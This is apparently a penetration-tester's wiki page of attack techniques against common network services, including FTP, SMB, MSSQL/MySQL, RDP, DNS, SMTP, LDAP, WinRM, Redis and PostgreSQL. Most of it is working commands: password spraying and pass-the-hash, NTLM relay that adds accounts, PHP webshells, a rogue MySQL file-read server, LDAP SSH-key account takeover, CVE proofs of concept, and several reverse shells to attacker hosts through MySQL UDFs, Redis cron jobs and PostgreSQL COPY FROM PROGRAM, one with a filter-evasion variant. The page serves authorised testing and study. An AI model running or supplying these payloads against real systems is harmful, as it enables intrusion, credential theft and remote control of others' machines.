---
title: "Network Service Attacks"
type: technique
tags: [dns, enumeration, exploitation, htb, network, rdp, smb, thm]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-15
sources: [cpts-common-services, thm-linux-smb, thm-linux-services, thm-linux-pop3, hacktricks-network]
---

# Network Service Attacks

## What It Is

Attacking common network services involves exploiting misconfigurations, weak credentials, excessive privileges, or known vulnerabilities in protocols such as FTP, SMB, SQL databases, RDP, DNS, SMTP, POP3, and IMAP to gain unauthorized access, execute commands, or extract sensitive data. Every service exposes an attack surface that can be mapped to a consistent pattern: a source of attacker-controlled input reaches a vulnerable process running under specific privileges and produces a useful destination (code execution, credential capture, or data exfiltration).

## General Approach

1. **Banner grab / version scan** — identify the service, version, and OS.
2. **Enumerate misconfigurations** — anonymous/null sessions, default credentials, open relays, zone transfers.
3. **Brute force or password spray** — use known usernames with common or leaked passwords; respect lockout thresholds.
4. **Protocol-specific exploitation** — leverage service-native features (xp_cmdshell, tscon, VRFY, AXFR, bounce attack, etc.).
5. **Post-exploitation** — extract credentials, pivot via linked servers or relay attacks, escalate privileges.

---

## FTP (Port 21 / 2121)

### Anonymous Login

FTP servers may allow `anonymous` as the username with no password. Anonymous access can expose sensitive files and, if write permissions are misconfigured, allow uploading malicious scripts that a web server may execute.

```sh
ftp <IP>
# Username: anonymous  Password: (blank)
ftp> ls
ftp> get <file>
ftp> mget *
```

Nmap's default scripts automatically check for anonymous FTP login:

```sh
sudo nmap -sC -sV -p 21 <IP>
```

### Brute Force

```sh
medusa -u <username> -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
medusa -U users.list -P passwords.list -h <IP> -n 2121 -M ftp -t 50
```

### FTP Bounce Attack

The FTP bounce attack abuses the `PORT` command to proxy connections through an FTP server and scan or reach internal hosts that are not directly exposed:

```sh
nmap -Pn -v -n -p80 -b anonymous:password@<FTP_IP> <INTERNAL_IP>
```

### Notable FTP CVEs

| CVE | Description |
|-----|-------------|
| CVE-2022-22836 | CoreFTP before build 727 — authenticated path traversal via HTTP PUT, leading to arbitrary file write outside the FTP root |

**CoreFTP CVE-2022-22836 PoC:**

```sh
curl -k -X PUT -H "Host: <IP>" --basic -u <user>:<pass> \
  --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

---

## SMB (Ports 139 / 445)

Server Message Block provides file sharing, printer access, and RPC. On Windows 2000+, SMB runs directly over TCP/445; legacy NetBIOS uses 139. Samba brings SMB to Linux/Unix.

### Null Session Enumeration

A null session requires no credentials. Many tools support it.

```sh
# List shares
smbclient -N -L //<IP>

# Enumerate permissions
smbmap -H <IP>
smbmap -H <IP> -r <share>
smbmap -H <IP> --download "<share>\<file>"

# RPC null session
rpcclient -U'%' <IP>
rpcclient $> enumdomusers
rpcclient $> queryuser <username>

# Full automated null-session enum
./enum4linux-ng.py <IP> -A -C
```

### Brute Force / Password Spray

```sh
# Password spray with CrackMapExec
crackmapexec smb <IP> -u /tmp/userlist.txt -p 'Company01!' --local-auth
crackmapexec smb <CIDR> -u administrator -p 'Password123!' --loggedon-users

# Dump SAM hashes (requires admin)
crackmapexec smb <IP> -u administrator -p 'Password123!' --sam

# Pass-the-Hash
crackmapexec smb <IP> -u Administrator -H <NTLM_HASH>
```

### Remote Code Execution via SMB

```sh
# Impacket PsExec (requires admin$ write access)
impacket-psexec administrator:'Password123!'@<IP>

# Impacket SMBExec / atexec
impacket-smbexec administrator:'Password123!'@<IP>

# CrackMapExec exec
crackmapexec smb <IP> -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

### Forced Authentication / NTLM Hash Capture

Responder poisons LLMNR/NBT-NS/MDNS to capture NTLMv2 hashes from machines that mistype share names or resolve hostnames via broadcast:

```sh
sudo responder -I <interface>
# Hashes land in /usr/share/responder/logs/
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Relay Attack

When SMB signing is disabled, captured hashes can be relayed directly to other hosts:

```sh
# 1. Disable SMB in Responder
# Edit /etc/responder/Responder.conf → SMB = Off
sudo responder -I <interface>

# 2. Relay to target (dumps SAM by default)
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>

# 3. Or execute a command via relay
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<cmd>'
```

### Skynet CTF — SMB Chained Attack Pattern

A real-world example from the Skynet THM room demonstrates the chaining approach:
1. Enumerate SMB shares with `smbmap` / `smbclient` (null session).
2. Recover a username from files in an open share.
3. Brute-force a webmail login using the username and a password list found on the SMB share.
4. Read emails containing the SMB share password.
5. Access the authenticated share, find a hidden directory path, and chain into a CMS local file inclusion.

### Notable SMB CVEs

| CVE | Name | Description |
|-----|------|-------------|
| CVE-2020-0796 | SMBGhost | SMBv3.1.1 compression — integer overflow in SMB driver allowing unauthenticated RCE on Windows 10 1903/1909 |
| CVE-2017-0144 | EternalBlue | SMBv1 buffer overflow enabling unauthenticated RCE; basis of WannaCry/NotPetya (historical but still relevant) |

---

## SQL Databases — MySQL (3306) / MSSQL (1433/1434/2433)

Database hosts are high-value targets because they store credentials, PII, and business data, and often run as highly privileged service accounts.

### Authentication Modes

- **MSSQL:** Windows Authentication (integrated, no extra creds needed if user is already authed) or SQL Server Mixed Mode (username + password pair stored in SQL Server).
- **MySQL:** Username/password; Windows Authentication available via plugin.

Misconfigured MSSQL may allow anonymous login, blank SA password, or guest account access.

### Connecting

```sh
# MSSQL from Linux
sqsh -S <IP> -U <user> -P '<pass>' -h
mssqlclient.py -p 1433 <user>@<IP>

# MSSQL from Windows
sqlcmd -S <IP> -U <user> -P '<pass>' -y 30 -Y 30

# MySQL
mysql -u <user> -p<pass> -h <IP>
```

### Enumerate Databases

```sql
-- MySQL
SHOW DATABASES;
USE <db>;
SHOW TABLES;
SELECT * FROM users;

-- MSSQL (sqlcmd syntax)
SELECT name FROM master.dbo.sysdatabases
GO
SELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES
GO
```

### MSSQL — xp_cmdshell (OS Command Execution)

`xp_cmdshell` is disabled by default but can be enabled by a sysadmin:

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- Execute OS command
xp_cmdshell 'whoami'
GO
```

### MySQL — Write Webshell via SELECT INTO OUTFILE

```sql
-- Check if writes are allowed (empty = unrestricted)
SHOW VARIABLES LIKE "secure_file_priv";

-- Write PHP webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### MSSQL — Capture Service Hash via xp_dirtree / xp_subdirs

Point an undocumented stored procedure at an attacker-controlled SMB share to steal the NTLMv2 hash of the SQL Server service account:

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO

EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
GO
```

Run simultaneously on the attacker:

```sh
sudo responder -I tun0
# or
sudo impacket-smbserver share ./ -smb2support
```

Then crack with hashcat:

```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### MSSQL — User Impersonation (Privilege Escalation)

```sql
-- Find impersonatable users
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Impersonate sa (or other sysadmin)
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Revert
REVERT
GO
```

### MSSQL — Linked Server Lateral Movement

```sql
-- Identify linked servers (isremote=1 is remote, isremote=0 is linked)
SELECT srvname, isremote FROM sysservers
GO

-- Execute command on linked server
EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [<LINKED_SERVER>]
GO
```

### MSSQL — Read Local Files

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

### MySQL — Read Local Files

```sql
SELECT LOAD_FILE("/etc/passwd");
```

### Notable SQL CVEs

| CVE | Description |
|-----|-------------|
| CVE-2012-2122 | MySQL 5.6.x timing attack auth bypass — repeated incorrect password eventually authenticates |

---

## RDP (Port 3389)

Remote Desktop Protocol provides GUI access to Windows systems. It is widely deployed for remote administration, making it an attractive target.

### Brute Force / Password Spray

```sh
# Crowbar
crowbar -b rdp -s <IP>/32 -U users.txt -c 'password123'

# Hydra
hydra -L usernames.txt -p 'password123' <IP> rdp

# Connect
xfreerdp /v:<IP> /u:<user> /p:<password>
rdesktop -u <user> -p <password> <IP>
```

### RDP Session Hijacking (tscon)

If you have SYSTEM privileges on a machine where another user is RDP'd in, you can steal their session without knowing their password:

```powershell
# List sessions
query user

# Create a service that runs tscon as SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>"
net start sessionhijack
```

Note: This method does not work on Windows Server 2019+.

### RDP Pass-the-Hash

Requires `Restricted Admin Mode` to be enabled on the target (disabled by default):

```powershell
# Enable Restricted Admin Mode on target
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# RDP with NT hash
xfreerdp /v:<IP> /u:<user> /pth:<NTLM_HASH>
```

### Notable RDP CVEs

| CVE | Name | Description |
|-----|------|-------------|
| CVE-2019-0708 | BlueKeep | Pre-authentication UAF in the RDP virtual channel handler; leads to SYSTEM-level RCE on Windows 7/Server 2008; exploiting it can cause BSoD |

---

## DNS (Port 53 UDP/TCP)

DNS is critical infrastructure. Misconfigurations in zone transfers and subdomain management expose the full DNS namespace and enable phishing and MITM attacks.

### Zone Transfer (AXFR)

An improperly configured DNS server responds to zone transfer requests from any source:

```sh
# Dig AXFR
dig AXFR @<NAMESERVER_IP> <domain>

# Fierce (automated zone transfer + brute force)
fierce --domain <domain>
```

### Subdomain Enumeration

```sh
# Subfinder (OSINT-based)
./subfinder -d <domain> -v

# Subbrute (pure DNS brute force, works internally)
git clone https://github.com/TheRook/subbrute.git
echo "<resolver_IP>" > ./resolvers.txt
./subbrute.py <domain> -s ./names.txt -r ./resolvers.txt

# Check CNAME records for takeover candidates
host <subdomain>
nslookup -type=CNAME <subdomain>
```

### Subdomain Takeover

If a subdomain's CNAME points to a third-party service (AWS S3, GitHub Pages, Fastly, etc.) that no longer has the corresponding resource:
1. The third-party shows an HTTP 404 / "NoSuchBucket" / "There isn't a GitHub Pages site here" error.
2. The attacker registers the resource at that third-party service.
3. Traffic for the subdomain now flows to the attacker.

Reference: [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)

### DNS Cache Poisoning (Local Network)

Using Ettercap with a MITM position:

```sh
# Edit /etc/ettercap/etter.dns
# inlanefreight.com    A   <ATTACKER_IP>
# *.inlanefreight.com  A   <ATTACKER_IP>

ettercap -T -M arp -P dns_spoof /<VICTIM_IP>// /<GATEWAY_IP>//
```

Using Bettercap:

```sh
bettercap -iface <interface>
# In bettercap console:
set dns.spoof.domains <domain>
dns.spoof on
```

### Notable DNS Vulnerabilities

Subdomain takeover is the most impactful current DNS risk at scale. A 2020 RedHuntLabs study found 424,120 vulnerable subdomains across 220 million domains studied; 62% were in e-commerce. No single CVE — it is a systemic misconfiguration pattern.

---

## SMTP / Email Services (Ports 25, 465, 587, 143, 110, 993, 995)

Email servers run multiple protocols: SMTP for sending (port 25/465/587), POP3 for retrieval (110/995), IMAP for synced retrieval (143/993).

### Identify Mail Server (MX Records)

```sh
host -t MX <domain>
dig mx <domain> | grep "MX" | grep -v ";"
```

### Port Scan

```sh
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <IP>
```

### User Enumeration — SMTP VRFY / EXPN / RCPT TO

```sh
# Manual telnet
telnet <IP> 25
VRFY root
EXPN support-team
MAIL FROM:test@test.com
RCPT TO:john
```

Automated:

```sh
smtp-user-enum -M RCPT -U userlist.txt -D <domain> -t <IP>
smtp-user-enum -M VRFY -U userlist.txt -t <IP>
```

### User Enumeration — POP3 USER Command

```sh
telnet <IP> 110
USER julio    # -ERR = user does not exist
USER john     # +OK = user exists
```

### Password Brute Force

```sh
hydra -L users.txt -p 'Company01!' -f <IP> pop3
hydra -l <user>@<domain> -P /usr/share/wordlists/rockyou.txt smtp://<IP> -f
```

### Reading Email via POP3 (Manual)

```sh
nc <IP> 110
USER <username>
PASS <password>
LIST
RETR 1
RETR 2
```

### Cloud Email Enumeration / Spray

```sh
# Validate O365 domain
python3 o365spray.py --validate --domain <domain>

# Enumerate users
python3 o365spray.py --enum -U users.txt --domain <domain>

# Password spray
python3 o365spray.py --spray -U users.txt -p 'March2022!' --count 1 --lockout 1 --domain <domain>
```

### Open Relay Abuse

```sh
# Detect open relay
nmap -p25 -Pn --script smtp-open-relay <IP>

# Send phishing email through open relay
swaks --from notifications@<domain> \
      --to employees@<domain> \
      --header 'Subject: Company Notification' \
      --body 'http://attacker.com/phish' \
      --server <IP>
```

### POP3 in Practice — Fowsniff CTF Chain

A practical attack chain from the Fowsniff THM room:
1. MD5 password hashes leaked online; cracked with John the Ripper (`--format=Raw-MD5`).
2. Authenticated to POP3 with cracked credentials; retrieved emails containing an SSH temporary password.
3. SSH login, kernel exploit (searchsploit for kernel version), then SUID/startup script abuse for root.

### POP3 in Practice — GoldenEye Chain

A multi-stage chain from the GoldenEye THM room:
1. JS source in a web page contained an HTML-encoded password (decoded with CyberChef).
2. Hydra brute-forced POP3 (non-standard port 55007) for multiple users.
3. Emails contained credentials for a Moodle CMS; admin panel used for Python reverse shell.
4. Kernel exploit (3.13.0-32-generic, EDB-37292) for root.

### Notable Email CVEs

| CVE | Description |
|-----|-------------|
| CVE-2020-7247 | OpenSMTPD <= 6.6.2 — pre-auth RCE via semicolon injection in the sender address field; exploitable since 2018 |

---

## POP3 / IMAP — Credential Brute Force & Email Extraction

POP3 and IMAP are the primary email retrieval protocols. After obtaining credentials (via brute force, capture, or leaked hash cracking), an attacker can read all stored email for intelligence, lateral movement credentials, and sensitive data.

```sh
# POP3 brute force
hydra -L users.txt -P passwords.txt <IP> pop3

# IMAP brute force
hydra -L users.txt -P passwords.txt <IP> imap

# Read POP3 inbox interactively
nc <IP> 110
USER <user>
PASS <pass>
LIST
RETR <message_number>
QUIT
```

For IMAP, use a mail client such as Evolution (`sudo apt-get install evolution`) or mutt to interact with mailboxes interactively.

---

## SNMP (Ports 161 UDP / 162 UDP)

SNMP (Simple Network Management Protocol) is used for network device management. Community strings act as passwords; "public" (read) and "private" (read-write) are often left at defaults.

### Community String Enumeration

```sh
# Brute-force community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt <IP>

# Walk MIB tree (read all OIDs)
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1    # System info
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4  # Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6  # Installed software
```

### SNMP Write Abuse (private community)

If the `private` community string is known and the device allows SNMP sets, an attacker can modify running configuration — potentially changing device settings, adding routes, or overwriting credentials:

```sh
snmpset -v2c -c private <IP> <OID> <type> <value>
```

---

## MySQL UDF privilege escalation (lib_mysqludf_sys) with NTFS ADS plugin-dir trick

If mysqld runs as root (or another privileged user), load lib_mysqludf_sys into the
plugin dir and register sys_exec to run OS commands as that user. The prebuilt .so/.dll
ship with sqlmap and metasploit (locate lib_mysqludf_sys). On Windows, if the plugin
directory does not exist, create it from a bare file-write primitive using an NTFS
alternate data stream (::$INDEX_ALLOCATION).

```sql
-- Linux: drop the library into the plugin dir, register sys_exec, run commands
USE mysql;
SHOW VARIABLES LIKE '%plugin%';                 -- find plugin_dir
CREATE TABLE npn(line blob);
INSERT INTO npn VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
SELECT * FROM npn INTO DUMPFILE '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```

```sql
-- Windows: bootstrap the plugin directory via NTFS ADS when it is missing
SELECT 1 INTO OUTFILE 'C:\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';
-- C:\MySQL\lib\plugin now exists as a directory, then run the DUMPFILE/CREATE FUNCTION chain
```

---

## MySQL rogue-server client-side file read and JDBC deserialization

A MySQL/MariaDB server that answers LOAD DATA LOCAL INFILE tells the CLIENT to read and
send the file. If you can make any MySQL client connect to your rogue server (DNS
control, config injection), you read arbitrary files from the client host. JDBC clients
are worse: with autoDeserialize or a poisoned URL you reach RCE in the client process.

```bash
# Rogue server that harvests files from connecting clients
# Rogue-MySql-Server (python) or mysql-fake-server (java)
java -jar fake-mysql-cli.jar -p 3306
# Point the victim JDBC client at it; request a file by base64 in the username field:
#   jdbc:mysql://attacker:3306/test?allowLoadLocalInfile=true
#   username = fileread_/etc/passwd  ->  ZmlsZXJlYWRfL2V0Yy9wYXNzd2Q=
```

```
# JDBC propertiesTransform RCE (Connector/J <= 8.0.32, CVE-2023-21971): a controllable
# JDBC URL loads an attacker class on the CLIENT (pre-auth, no valid creds needed)
jdbc:mysql://<attacker>:3306/test?user=root&password=root&propertiesTransform=com.evil.Evil
```

Hardening to note: allowLoadLocalInfile=false, autoDeserialize=false, empty
propertiesTransform, LOCAL_INFILE=0. caching_sha2_password hashes crack with hashcat
mode 21100 / john --format=mysql-sha2.

---

## LDAP write-primitive account takeover (sshPublicKey / userPassword)

LDAP enumeration is well covered, but the write side is the higher-impact gap. If a
bind (even anonymous/null on a misconfigured server, or a low-priv account) can MODIFY
directory attributes, you can take over accounts: set sshPublicKey on a user whose SSH
reads keys from LDAP, or reset userPassword. First confirm the write actually lands.

```python
import ldap3
s = ldap3.Server('<target>', port=636, use_ssl=True)
c = ldap3.Connection(s, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
c.bind()
c.extend.standard.who_am_i()          # confirm identity
# Inject your SSH key so you can log in as that user without a password
c.modify('uid=VICTIM,ou=USERS,dc=DOMAIN,dc=DOMAIN',
         {'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3... attacker@evil'])]})
```

```bash
# Null-bind enumeration first, to find writable/interesting objects (NetExec)
netexec ldap <DC_FQDN> -u '' -p '' --query "(sAMAccountName=*)" ""
# TLS SNI bypass: reach the service with any hostname for anonymous reads
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```

---

## MSRPC endpoint-mapper and IOXIDResolver enumeration (port 135)

The wiki treats 135 mostly as a WMI/DCOM transport. Enumerating the endpoint mapper
itself reveals reachable interfaces (SAMR for lockout-agnostic user probing, atsvc/svcctl
for exec, etc.), and the IOXIDResolver ServerAlive2 method leaks a host's network
interfaces (including IPv6) with NO authentication, a classic way to find a pivot IP.

```bash
# Dump registered RPC interfaces (IFIDs, bindings, named pipes)
impacket-rpcdump <IP> -p 135
# Metasploit auditors for 135
# use auxiliary/scanner/dcerpc/endpoint_mapper
# use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

# Unauthenticated interface/IPv6 disclosure via IOXIDResolver ServerAlive2
python3 IOXIDResolver.py -t <IP>       # from mubix/IOXIDResolver
# impacket-rpcmap 'ncacn_ip_tcp:<IP>' also maps interfaces by stringbinding
```

Notable interfaces: \pipe\samr (SAMR, user enum and password grinding regardless of
lockout policy), \pipe\atsvc and \pipe\svcctl (remote command execution primitives).

---

## MS-EVEN EventLog-in low-priv remote arbitrary file write (CVE-2025-29969)

The MS-EVEN RPC interface (\pipe\even) has a TOCTOU flaw letting an authenticated
LOW-privileged user perform a remote arbitrary file write (attacker content to an
attacker path, no admin rights). The typical chain writes to a per-user Startup folder
for execution at next logon in that user's context. It also exposes a CreateFile-style
existence probe for software/path discovery.

```bash
# Host a valid EVTX plus payload on an SMB share (PoC hard-codes share name "Share")
impacket-smbserver -smb2support Share /tmp/safebreach

# Race the MS-EVEN logic so the target fetches the file and writes it to your path
python write_file_remotely.py <TARGET> <ATTACKER> lowuser Test123 \
  "/tmp/safebreach/Sample.evtx" "calc.bat" \
  "C:\Users\lowuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\target.bat"

# Existence probe for recon (any authenticated user)
python check_if_exists.py <TARGET> lowuser 'Password1!' "C:\Program Files\Wireshark"
# -> FILE_EXISTS_AND_IS_DIRECTORY
```

---

## MSRPC dynamic client generation and fuzzing (NtObjectManager, MS-RPC-Fuzzer)

For research against the large undocumented MSRPC attack surface, NtObjectManager turns
any RPC server DLL/EXE into a usable client stub with no IDL, and MS-RPC-Fuzzer drives
context-aware, dependency-ordered fuzzing of every procedure, exporting to Neo4j.
Because many RPC services run as SYSTEM, a memory-safety bug is often LPE or (over
SMB/135) RCE.

```powershell
Install-Module NtObjectManager -Force
$ifs = Get-RpcServer "C:\Windows\System32\efssvc.dll"     # parse interfaces + procs
Format-RpcClient $ifs[0] -Namespace MS_EFSR -OutputPath .\MS_EFSR.cs   # ready C# stub
$c = Get-RpcClient $ifs[0]
Connect-RpcClient $c -stringbinding 'ncacn_np:127.0.0.1[\pipe\efsrpc]' `
  -AuthenticationLevel PacketPrivacy -AuthenticationType WinNT

# Context-aware fuzzing across NDR types, tracking context handles between calls
Invoke-MSRPCFuzzer -Pipe "\\.\pipe\efsrpc" -Auth NTLM -MinLen 1 -MaxLen 0x400 `
  -Iterations 100000 -OutDir .\results   # log.txt last line names the crashing opnum
```

Run only in an isolated VM snapshot; the fuzzer causes service crashes and BSODs.

---

## RDP session shadowing (view or control another user's session)

Distinct from tscon session hijacking: if Remote Desktop Services shadowing is enabled,
built-in mstsc switches let you VIEW or CONTROL another user's active session, sometimes
without their consent depending on policy. Also fingerprint NLA to know whether a
pre-auth screenshot is possible.

```bash
# List sessions on the remote host, then shadow one
qwinsta /server:<IP>
mstsc /v:<IP> /shadow:<SESSION_ID> /control
mstsc /v:<IP> /shadow:<SESSION_ID> /noconsentprompt /prompt   # if policy allows
# Check the target's shadow policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
```

```bash
# NLA / security-layer fingerprint and screenshots
nmap --script rdp-enum-encryption -p 3389 <IP>
nxc rdp <IP> --nla-screenshot                     # only works when NLA is disabled
nxc rdp <IP> -u <user> -p <password> --screenshot # authenticated
```

---

## WinRM NTLM relay to WS-MAN and WSMan.Automation COM lateral movement

Two WinRM-specific offense paths the wiki lacks: relay captured NTLM straight to a
WinRM/WS-MAN listener for SYSTEM-level exec when 5985 speaks unencrypted HTTP, and drive
WinRM through the WSMan.Automation COM object (no PowerShell), useful under
Constrained-Language mode.

```bash
# ntlmrelayx to WS-MAN (Impacket 0.11+); pair with mitm6/Responder to coerce auth
sudo ntlmrelayx.py -t wsman://10.0.0.25 --no-smb-server -smb2support \
  --command "net user pwned P@ssw0rd! /add"
```

```powershell
# WSMan.Automation COM: WinRM exec without PowerShell (CLM-friendly)
$ws = New-Object -ComObject 'WSMan.Automation'
$s  = $ws.CreateSession('http://srv01:5985/wsman',0,$null)
$id = $s.Command('cmd.exe',@('/c','whoami'))       # chain: svchost -> wmiprvse -> cmd
$s.Signal($id,0)
```

Evil-WinRM 3.x adds Kerberos (-k --spn HTTP/<host>) and cert auth (--cert-pem/--key-pem).
Defense side: disable the HTTP listener and enable EPA. Detection: WinRM/Operational
events 91/163 (shell created), 182 (auth failure).

---

## Redis 6379 unauthenticated access and enumeration

Redis defaults to no authentication. A plaintext protocol means `nc` works, but
`redis-cli` is cleaner. `-NOAUTH Authentication required` on `INFO` means creds are
needed (default username is `default` when only `requirepass` is set). With access,
dump the databases for cached sessions, tokens, and credentials.

```bash
nmap --script redis-info -sV -p 6379 <IP>
redis-cli -h <IP>                 # or: nc -vn <IP> 6379
# inside redis-cli
INFO                              # version + keyspace; -NOAUTH means auth required
AUTH <user> <password>            # authenticate if configured (+OK on success)
CONFIG GET *                      # full config (look for dir, dbfilename, requirepass)
INFO keyspace                     # which DBs (0..n) hold data
SELECT 1                          # switch DB
KEYS *                            # list keys
TYPE <key>                        # string/list/hash/set
GET <key>                         # string value
LRANGE <key> 0 -1                 # list value
HGETALL <key>                     # hash value
```

---

## Redis 6379 RCE via CONFIG SET (webshell, SSH key, cron)

An unauthenticated (or write-capable) Redis lets you relocate the RDB dump file to a
writable path and set its contents, giving three RCE primitives: write a webshell into
a webroot, plant an SSH `authorized_keys` in the redis user home, or drop a cron job.
Run `CONFIG GET dir` first, its value can change after other commands.

```bash
# --- PHP webshell into a known webroot ---
redis-cli -h <IP> config set dir /var/www/html
redis-cli -h <IP> config set dbfilename shell.php
redis-cli -h <IP> set x "<?php system(\$_GET['c']); ?>"
redis-cli -h <IP> save        # -> http://<IP>/shell.php?c=id

# --- SSH authorized_keys (redis user home, e.g. /var/lib/redis/.ssh) ---
ssh-keygen -t rsa -f ./id_rsa -N ''
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h <IP> -x set ssh_key
redis-cli -h <IP> config set dir /var/lib/redis/.ssh
redis-cli -h <IP> config set dbfilename authorized_keys
redis-cli -h <IP> save
ssh -i ./id_rsa redis@<IP>

# --- cron reverse shell (Ubuntu path shown; CentOS uses /var/spool/cron/) ---
echo -e "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'\n\n" | redis-cli -h <IP> -x set 1
redis-cli -h <IP> config set dir /var/spool/cron/crontabs/
redis-cli -h <IP> config set dbfilename root
redis-cli -h <IP> save
```

---

## Redis 6379 RCE via MODULE LOAD and master-slave replication

If you can upload a compiled `.so` module you get direct command execution; if not, the
master-slave replication trick (redis-rogue-server, Redis <= 5.0.5) synchronizes a
malicious module from an attacker-controlled master to the victim slave and loads it.

```bash
# --- Load a command-exec module (RedisModules-ExecuteCommand) ---
redis-cli -h <IP> MODULE LOAD /tmp/module.so
redis-cli -h <IP> MODULE LIST
redis-cli -h <IP> system.exec "id"
redis-cli -h <IP> system.rev <LHOST> 9999      # reverse shell
redis-cli -h <IP> MODULE UNLOAD system

# --- Automated master-slave replication RCE (auto interactive/reverse shell) ---
# https://github.com/n0b0dyCN/redis-rogue-server
./redis-rogue-server.py --rhost <IP> --lhost <LHOST>

# --- Manual replication: point the victim slave at your master ---
redis-cli -h <IP> -p 6379 slaveof <LHOST> 6379
```

---

## Redis 6379 Lua sandbox escape (CVE-2022-0543 and 2025 engine bugs)

Redis runs `EVAL` Lua in a sandbox. Debian/Ubuntu packaging left `package`/`os`
reachable (CVE-2022-0543 -> full RCE). Recent engine flaws (fixed in 8.2.2 / 8.0.4 /
7.4.6 / 7.2.11 / 6.2.20) allow sandbox escape and cross-user code execution when the
attacker can authenticate and Lua (`EVAL`/`FUNCTION`) is enabled. All post-auth or
post-access; cross-reference wiki/cheatsheets/cve-arsenal.md.

```bash
# CVE-2022-0543 (Debian Lua sandbox escape) -> OS command
redis-cli -h <IP> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io = io_l(); local f = io.popen("id","r"); local res = f:read("*a"); f:close(); return res' 0

# CVE-2025-46818 - poison string metatable for cross-user code exec inside the sandbox
redis-cli -h <IP> -a <pass> EVAL "getmetatable('').__index = function(_,k) if k=='x' then return function() return 'pwn' end end end; return ('s').x()" 0

# CVE-2025-46817 - unpack integer-overflow DoS
redis-cli -h <IP> -a <pass> EVAL "return unpack({'a','b','c'}, -1, 2147483647)" 0
```

---

## PostgreSQL 5432 RCE via COPY ... FROM PROGRAM (CVE-2019-9193)

A superuser or a member of `pg_execute_server_program` can run OS commands through
`COPY ... FROM PROGRAM`. Postgres calls this a feature, so it is unpatched. If you hold
`CREATEROLE` you can grant yourself the group first. In WAF/SQLi contexts build the
`COPY` keyword dynamically inside a `DO` block to dodge keyword filters.

```bash
psql -h <IP> -U <user> -d postgres          # or: mssqlclient-style clients
```

```sql
-- Confirm privilege
SELECT current_setting('is_superuser');
GRANT pg_execute_server_program TO "<user>";   -- if you only have CREATEROLE

-- Command execution
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Reverse shell
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"';

-- WAF bypass: assemble COPY via CHR() inside a PL/pgSQL DO block
DO $$ DECLARE cmd text; BEGIN
  cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"''';
  EXECUTE cmd; END $$;
```

Metasploit equivalent: `multi/postgres/postgres_copy_from_program_cmd_exec`.

---

## PostgreSQL 5432 arbitrary file read and write

`pg_read_server_files` / `pg_write_server_files` (or superuser) grant filesystem access.
`COPY` reads/writes text files; `pg_read_file`/`pg_ls_dir` read files and list dirs; the
large-object `lo_import`/`lo_export` functions move binary files (handy for uploading a
shell or overwriting a table filenode to become superuser).

```sql
-- Read a file with COPY
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;

-- Read via admin functions (run from the postgres DB: \c postgres)
SELECT * FROM pg_ls_dir('/tmp');
SELECT pg_read_file('/etc/passwd', 0, 1000000);
SELECT pg_read_binary_file('/etc/postgresql/13/main/pg_hba.conf');

-- Dump stored credential hashes
SELECT usename, passwd FROM pg_shadow;

